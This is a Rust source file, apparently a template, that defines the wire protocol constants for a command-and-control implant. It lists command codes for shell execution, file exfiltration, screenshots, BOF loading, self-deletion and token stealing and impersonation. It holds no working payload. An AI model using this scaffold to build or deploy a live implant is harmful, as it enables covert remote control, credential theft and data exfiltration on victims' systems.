// __NAME__ Agent — Wire Protocol
//
// Protocol constants and data structures for C2 communication.
// Must match the server-side plugin (pl_utils.go).

#![allow(dead_code)]

/// Protocol watermark (must match agent registration)
pub const WATERMARK: u32 = 0x__WATERMARK__;

// ─── Command codes ─────────────────────────────────────────────────────────────

pub const COMMAND_EXIT: u8 = 0;
pub const COMMAND_UNKNOWN: u8 = 1;

// File system
pub const COMMAND_FS_LIST: u8 = 10;
pub const COMMAND_FS_UPLOAD: u8 = 11;
pub const COMMAND_FS_DOWNLOAD: u8 = 12;
pub const COMMAND_FS_REMOVE: u8 = 13;
pub const COMMAND_FS_MKDIRS: u8 = 14;
pub const COMMAND_FS_COPY: u8 = 15;
pub const COMMAND_FS_MOVE: u8 = 16;
pub const COMMAND_FS_CD: u8 = 17;
pub const COMMAND_FS_PWD: u8 = 18;
pub const COMMAND_FS_CAT: u8 = 19;

// OS commands
pub const COMMAND_OS_RUN: u8 = 20;
pub const COMMAND_OS_INFO: u8 = 21;
pub const COMMAND_OS_PS: u8 = 22;
pub const COMMAND_OS_SCREENSHOT: u8 = 23;
pub const COMMAND_OS_SHELL: u8 = 24;
pub const COMMAND_OS_KILL: u8 = 25;

// Profile tuning
pub const COMMAND_PROFILE_SLEEP: u8 = 40;
pub const COMMAND_PROFILE_KILLDATE: u8 = 41;
pub const COMMAND_PROFILE_WORKTIME: u8 = 42;

// BOF execution
pub const COMMAND_EXEC_BOF: u8 = 50;
pub const COMMAND_EXEC_BOF_OUT: u8 = 51;
pub const COMMAND_EXEC_BOF_ASYNC: u8 = 52;

// Self-delete, token, config
pub const COMMAND_SELFDEL: u8 = 53;
pub const COMMAND_TOKEN_STEAL: u8 = 54;
pub const COMMAND_TOKEN_IMPERSONATE: u8 = 55;
pub const COMMAND_TOKEN_MAKE: u8 = 56;
pub const COMMAND_TOKEN_LIST: u8 = 57;
pub const COMMAND_TOKEN_REMOVE: u8 = 58;
pub const COMMAND_TOKEN_PRIVS: u8 = 59;
pub const COMMAND_CONFIG: u8 = 60;

// Job management
pub const COMMAND_JOB_LIST: u8 = 70;
pub const COMMAND_JOB_KILL: u8 = 71;

// ─── Response codes ────────────────────────────────────────────────────────────

pub const RESP_COMPLETE: u8 = 0;
pub const RESP_ERROR: u8 = 1;
pub const RESP_FS_LIST: u8 = 10;
pub const RESP_FS_UPLOAD: u8 = 11;
pub const RESP_FS_DOWNLOAD: u8 = 12;
pub const RESP_FS_PWD: u8 = 18;
pub const RESP_FS_CAT: u8 = 19;
pub const RESP_OS_RUN: u8 = 20;
pub const RESP_OS_INFO: u8 = 21;
pub const RESP_OS_PS: u8 = 22;
pub const RESP_OS_SCREENSHOT: u8 = 23;
pub const RESP_OS_SHELL: u8 = 24;

// ─── Pack types ────────────────────────────────────────────────────────────────

pub const EXFIL_PACK: u8 = 100;
pub const JOB_PACK: u8 = 101;
pub const BOF_PACK: u8 = 102;

// ─── BOF callback & error codes ────────────────────────────────────────────────

pub const CALLBACK_OUTPUT: u16 = 0x0;
pub const CALLBACK_OUTPUT_OEM: u16 = 0x1e;
pub const CALLBACK_OUTPUT_UTF8: u16 = 0x20;
pub const CALLBACK_ERROR: u16 = 0x0d;
pub const CALLBACK_CUSTOM: u16 = 0x1000;
pub const CALLBACK_CUSTOM_LAST: u16 = 0x13ff;

pub const CALLBACK_AX_SCREENSHOT: u16 = 0x81;
pub const CALLBACK_AX_DOWNLOAD_MEM: u16 = 0x82;

pub const BOF_ERROR_PARSE: u32 = 0x101;
pub const BOF_ERROR_SYMBOL: u32 = 0x102;
pub const BOF_ERROR_MAX_FUNCS: u32 = 0x103;
pub const BOF_ERROR_ENTRY: u32 = 0x104;
pub const BOF_ERROR_ALLOC: u32 = 0x105;

/// Task response to the server
pub struct TaskResponse {
    pub task_id: u32,
    pub code: u8,
    pub data: Vec<u8>,
}
